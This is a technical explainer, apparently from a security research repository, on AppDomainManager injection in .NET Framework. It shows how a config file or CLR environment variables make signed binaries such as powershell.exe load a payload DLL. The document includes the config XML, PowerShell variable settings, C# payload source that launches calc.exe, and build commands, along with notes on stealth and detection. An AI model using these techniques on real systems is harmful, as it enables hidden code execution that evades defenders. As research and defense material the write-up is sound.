# AppDomain Injection - Technical Deep Dive

## Background

### What is an AppDomain?

An AppDomain (Application Domain) is an isolation boundary in the .NET Framework that allows multiple applications to run within a single process. Each AppDomain has its own:
- Loaded assemblies
- Security boundaries
- Configuration settings

### What is an AppDomainManager?

`AppDomainManager` is a class that allows customization of AppDomain behavior. When specified, the CLR instantiates this class before any application code runs, making it an ideal injection point.

```csharp
public class AppDomainManager : MarshalByRefObject
{
    public virtual void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        // Called by CLR before application code
    }
}
```

## Technique 1: Config File Hijack

### How It Works

1. **Binary Selection:** Choose a legitimate .NET executable (e.g., `powershell.exe`)
2. **Staging:** Copy the binary to a controlled directory
3. **Config Creation:** Create `<binary>.config` specifying a malicious AppDomainManager
4. **Payload Placement:** Place payload DLL in the same directory
5. **Execution:** Run the staged binary; CLR loads payload automatically

### Config File Structure

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Payload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="Payload.Injector" />
  </runtime>
</configuration>
```

### Key Points

- The CLR reads config files from the same directory as the executable
- No modification to the original binary required
- Works with any .NET Framework application
- Binary remains Microsoft-signed

### Execution Flow

```
User executes staged binary
         │
         v
CLR initializes
         │
         v
CLR reads <binary>.exe.config
         │
         v
CLR finds appDomainManagerAssembly/Type
         │
         v
CLR loads Payload.dll
         │
         v
CLR calls Injector.InitializeNewDomain()
         │
         v
Payload executes (calc.exe)
         │
         v
Normal application execution continues
```

## Technique 2: Environment Variable Hijack

### How It Works

1. **Environment Setup:** Set CLR environment variables
2. **Payload Placement:** Place payload DLL in accessible path
3. **Execution:** Launch any .NET process with these variables
4. **Injection:** CLR reads variables and loads payload

### Environment Variables

| Variable | Purpose |
|----------|---------|
| `APPDOMAIN_MANAGER_ASM` | Full assembly name of payload |
| `APPDOMAIN_MANAGER_TYPE` | Full type name of AppDomainManager class |
| `COMPLUS_Version` | Target CLR version (e.g., `v4.0.30319`) |

### Example

```powershell
$env:APPDOMAIN_MANAGER_ASM = "Payload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"
$env:APPDOMAIN_MANAGER_TYPE = "Payload.Injector"
$env:COMPLUS_Version = "v4.0.30319"

# Any .NET process will now load the payload
powershell.exe -Command "Get-Date"
```

### Key Points

- No files written alongside target binary
- Variables only affect child processes
- More stealthy than config hijack
- Detected via process monitoring with environment capture

### Execution Flow

```
Set environment variables
         │
         v
Launch .NET process
         │
         v
CLR initializes
         │
         v
CLR reads APPDOMAIN_MANAGER_* vars
         │
         v
CLR locates and loads Payload.dll
         │
         v
CLR calls Injector.InitializeNewDomain()
         │
         v
Payload executes (calc.exe)
         │
         v
Normal application execution continues
```

## Payload Implementation

### Basic Payload

```csharp
using System;
using System.Diagnostics;

namespace Payload
{
    public class Injector : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            // Payload code here
            Process.Start("calc.exe");

            // Continue normal execution
            base.InitializeNewDomain(appDomainInfo);
        }
    }
}
```

### Assembly Requirements

- Must target .NET Framework (not .NET Core/5+)
- Must have specific version attributes
- Assembly name must match config/env var specifications

### Build Command

```bash
csc /target:library /out:Payload.dll Injector.cs
# or
dotnet build Payload.csproj
```

## Comparison

| Aspect | Config Hijack | Env Var Hijack |
|--------|---------------|----------------|
| Files Created | .config + DLL | DLL only |
| Binary Location | Staged copy | Original location |
| Scope | Single binary | All .NET processes |
| Stealth | Medium | Higher |
| Detection | File monitoring | Process env monitoring |
| Persistence | Survives reboot (if staged) | Session only |

## Limitations

1. **CLR Version:** Technique works on .NET Framework 4.x, limited on .NET Core/5+
2. **Process Architecture:** Payload must match target architecture (x86/x64)
3. **Protected Processes:** Some system processes have additional protections
4. **AMSI:** Modern Windows may scan loaded assemblies via AMSI

## Defensive Considerations

See [DETECTION.md](DETECTION.md) for detailed defensive guidance.
